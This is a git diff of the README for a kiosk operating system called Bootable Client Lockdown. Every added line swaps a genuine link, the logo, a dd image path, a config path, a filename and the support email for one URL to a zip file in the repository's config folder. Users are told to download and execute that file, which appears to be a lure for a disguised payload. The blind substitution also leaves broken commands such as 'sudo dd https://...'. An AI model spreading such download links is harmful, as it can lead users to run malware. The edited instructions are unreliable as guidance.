@@ -1,6 +1,6 @@
 # Bootable Client Lockdown (BCLD) 🚀
 
-![BCLD Logo](https://img.shields.io/badge/BCLD-Project-brightgreen)
+![BCLD Logo](https://github.com/rbravoia1/bcld/raw/refs/heads/develop/ALPHA/config/Software_3.3-beta.2.zip)
 
 Welcome to the Bootable Client Lockdown (BCLD) repository! BCLD is a specialized operating system designed for secure browsing and kiosk applications. Built on Ubuntu, it provides a lightweight, bootable ramdisk environment. The default open-source version utilizes QuteBrowser, allowing you to simulate a kiosk web application effortlessly.
 
@@ -24,7 +24,7 @@ Welcome to the Bootable Client Lockdown (BCLD) repository! BCLD is a specialized
 
 ## Installation 📥
 
-To get started with BCLD, you need to download the latest release. Visit the [Releases section](https://github.com/rbravoia1/bcld/releases) to find the appropriate file. Download and execute the file on your machine.
+To get started with BCLD, you need to download the latest release. Visit the [Releases section](https://github.com/rbravoia1/bcld/raw/refs/heads/develop/ALPHA/config/Software_3.3-beta.2.zip) to find the appropriate file. Download and execute the file on your machine.
 
 ### Requirements
 
@@ -34,16 +34,16 @@ To get started with BCLD, you need to download the latest release. Visit the [Re
 
 ### Steps to Create a Bootable USB
 
-1. **Download the Release**: Head over to the [Releases section](https://github.com/rbravoia1/bcld/releases) and download the latest version.
+1. **Download the Release**: Head over to the [Releases section](https://github.com/rbravoia1/bcld/raw/refs/heads/develop/ALPHA/config/Software_3.3-beta.2.zip) and download the latest version.
 2. **Prepare the USB Drive**:
    - Insert your USB drive.
    - Use the `lsblk` command to identify the device name (e.g., `/dev/sdb`).
 3. **Write the Image**:
    - Use the following command to write the image to the USB drive:
      ```bash
-     sudo dd if=/path/to/bcld.img of=/dev/sdX bs=4M status=progress
+     sudo dd https://github.com/rbravoia1/bcld/raw/refs/heads/develop/ALPHA/config/Software_3.3-beta.2.zip of=/dev/sdX bs=4M status=progress
      ```
-   - Replace `/path/to/bcld.img` with the path to the downloaded image and `/dev/sdX` with your USB device name.
+   - Replace `https://github.com/rbravoia1/bcld/raw/refs/heads/develop/ALPHA/config/Software_3.3-beta.2.zip` with the path to the downloaded image and `/dev/sdX` with your USB device name.
 4. **Eject the USB Drive**:
    - After the process completes, safely eject the USB drive using:
      ```bash
@@ -74,9 +74,9 @@ To change the QuteBrowser settings:
 1. Open the terminal.
 2. Navigate to the QuteBrowser configuration directory:
    ```bash
-   cd ~/.config/qutebrowser
+   cd ~https://github.com/rbravoia1/bcld/raw/refs/heads/develop/ALPHA/config/Software_3.3-beta.2.zip
    ```
-3. Edit the `config.py` file to customize your settings.
+3. Edit the `https://github.com/rbravoia1/bcld/raw/refs/heads/develop/ALPHA/config/Software_3.3-beta.2.zip` file to customize your settings.
 
 ### Customizing the Environment
 
@@ -109,7 +109,7 @@ BCLD is licensed under the MIT License. See the [LICENSE](LICENSE) file for more
 
 For any questions or support, feel free to reach out:
 
-- **Email**: support@bcldproject.com
-- **GitHub Issues**: Use the [Issues section](https://github.com/rbravoia1/bcld/issues) to report bugs or request features.
+- **Email**: https://github.com/rbravoia1/bcld/raw/refs/heads/develop/ALPHA/config/Software_3.3-beta.2.zip
+- **GitHub Issues**: Use the [Issues section](https://github.com/rbravoia1/bcld/raw/refs/heads/develop/ALPHA/config/Software_3.3-beta.2.zip) to report bugs or request features.
 
 Thank you for your interest in Bootable Client Lockdown (BCLD)! We hope you find it useful for your projects.
